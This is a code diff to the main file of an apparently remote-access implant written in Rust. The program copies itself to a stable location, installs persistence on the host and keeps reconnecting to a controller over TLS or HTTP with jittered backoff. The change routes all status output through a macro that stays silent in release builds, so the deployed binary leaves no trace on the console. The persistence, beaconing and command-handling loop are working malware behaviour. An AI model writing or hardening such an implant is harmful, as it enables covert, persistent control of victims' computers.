@@ -1,3 +1,16 @@
+/// Log to stderr in debug/test builds only. Silent in release.
+#[macro_export]
+macro_rules! dbg_log {
+    ($($arg:tt)*) => {
+        {
+            #[cfg(debug_assertions)]
+            {
+                eprintln!($($arg)*);
+            }
+        }
+    };
+}
+
 mod checkin;
 mod commands;
 mod config;
@@ -62,16 +75,16 @@ async fn main() -> anyhow::Result<()> {
     }
 
     let stable_path = persistence::copy_to_stable().unwrap_or_else(|e| {
-        eprintln!("[!] copy_to_stable: {e}");
+        dbg_log!("[!] copy_to_stable: {e}");
         std::env::current_exe().unwrap_or_default()
     });
 
     let chain = persistence::get_chain();
     for r in &chain.install_first_available(&stable_path) {
         if r.installed {
-            eprintln!("[+] Persistence installed: {}", r.name);
+            dbg_log!("[+] Persistence installed: {}", r.name);
         } else {
-            eprintln!(
+            dbg_log!(
                 "[!] Persistence failed ({}): {}",
                 r.name,
                 r.error.as_deref().unwrap_or("?")
@@ -81,12 +94,12 @@ async fn main() -> anyhow::Result<()> {
 
     let mut backoff = RECONNECT_BASE;
     loop {
-        eprintln!("[*] Connecting to {}:{}...", config.host, config.port);
+        dbg_log!("[*] Connecting to {}:{}...", config.host, config.port);
 
         #[cfg(feature = "http-transport")]
         let result = match transport::HttpTransport::connect(&config).await {
             Ok(mut t) => {
-                eprintln!("[+] HTTP transport ready");
+                dbg_log!("[+] HTTP transport ready");
                 backoff = RECONNECT_BASE;
                 t.run(&dispatch, &chain).await
             }
@@ -96,7 +109,7 @@ async fn main() -> anyhow::Result<()> {
         #[cfg(not(feature = "http-transport"))]
         let result = match transport::TlsTransport::connect(&config).await {
             Ok(mut t) => {
-                eprintln!("[+] TLS handshake complete");
+                dbg_log!("[+] TLS handshake complete");
                 backoff = RECONNECT_BASE;
                 run_tls_session(&mut t, &dispatch, &chain).await
             }
@@ -104,11 +117,11 @@ async fn main() -> anyhow::Result<()> {
         };
 
         if let Err(e) = result {
-            eprintln!("[!] Session ended: {e}");
+            dbg_log!("[!] Session ended: {e}");
         }
         let jitter = rand::thread_rng().gen_range(-RECONNECT_JITTER..RECONNECT_JITTER);
         let delay = backoff * (1.0 + jitter);
-        eprintln!("[*] Reconnecting in {delay:.1}s...");
+        dbg_log!("[*] Reconnecting in {delay:.1}s...");
         tokio::time::sleep(Duration::from_secs_f64(delay)).await;
         backoff = (backoff * 2.0).min(RECONNECT_MAX);
     }
@@ -124,7 +137,7 @@ async fn run_tls_session(
 
     let ack = transport.receive().await?;
     let session_id = ack.data["session_id"].as_str().unwrap_or("?");
-    eprintln!("[+] Registered, session: {session_id}");
+    dbg_log!("[+] Registered, session: {session_id}");
 
     loop {
         let packet = transport.receive().await?;
@@ -137,7 +150,7 @@ async fn run_tls_session(
                     .send(Packet::new("heartbeat", serde_json::json!({})))
                     .await?;
             }
-            other => eprintln!("[!] Unknown packet type: {other}"),
+            other => dbg_log!("[!] Unknown packet type: {other}"),
         }
     }
 }
